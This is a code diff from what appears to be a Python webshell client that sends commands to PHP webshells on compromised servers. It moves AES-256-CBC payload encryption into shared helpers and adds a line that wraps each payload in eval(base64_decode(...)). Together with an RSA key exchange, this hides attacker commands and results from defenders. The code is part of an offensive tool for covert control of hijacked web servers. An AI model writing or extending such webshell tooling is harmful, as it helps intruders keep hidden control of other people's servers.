@@ -11,9 +11,6 @@ import uuid
 import typing as t
 from binascii import Error as BinasciiError
 
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
-
 from . import exceptions
 
 from ..utils import (
@@ -21,6 +18,8 @@ from ..utils import (
     random_user_agent,
     get_rsa_key,
     private_decrypt_rsa,
+    encrypt_aes256_cbc,
+    decrypt_aes256_cbc,
 )
 from .base import (
     PHPSessionInterface,
@@ -306,14 +305,6 @@ def to_sessionize_payload(
     final = PAYLOAD_SESSIONIZE_TRIGGER.replace("PAYLOAD_STORE", payload_store_name)
     payloads.append(final)
     return payloads
-
-
-def padding_aes256_cbc(s):
-    return s + bytes((16 - len(s) % 16) for _ in range(16 - len(s) % 16))
-
-
-def unpadding_aes256_cbc(s):
-    return s[0 : -(s[-1])]
 
 
 # 给前端显示的PHPWebshellOptions选项
@@ -747,6 +738,7 @@ class PHPWebshell(PHPSessionInterface):
 
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
+            payload = f"eval(base64_decode({base64_encode(payload)}));"
             session_name = f"rsa_key_{uuid.uuid4()}"
             key_encrypted = await submitter(
                 """
@@ -775,10 +767,7 @@ class PHPWebshell(PHPSessionInterface):
                 raise exceptions.UnknownError(
                     "部署加密失败，无法从服务器获得对应的key"
                 ) from exc
-            iv = get_random_bytes(16)
-            payload_enc = iv + AES.new(key, AES.MODE_CBC, iv=iv).encrypt(
-                padding_aes256_cbc(payload.encode("utf-8"))
-            )
+            payload_enc = encrypt_aes256_cbc(key, payload.encode("utf-8"))
 
             result_enc = await submitter(
                 """
@@ -809,10 +798,7 @@ class PHPWebshell(PHPSessionInterface):
             )
             try:
                 result_enc = base64.b64decode(result_enc)
-                iv, result_enc = result_enc[:16], result_enc[16:]
-                result = unpadding_aes256_cbc(
-                    AES.new(key, AES.MODE_CBC, iv=iv).decrypt(result_enc)
-                ).decode("utf-8")
+                result = decrypt_aes256_cbc(key, result_enc).decode("utf-8")
                 return result
             except Exception as exc:
                 raise exceptions.UnknownError("解密失败") from exc
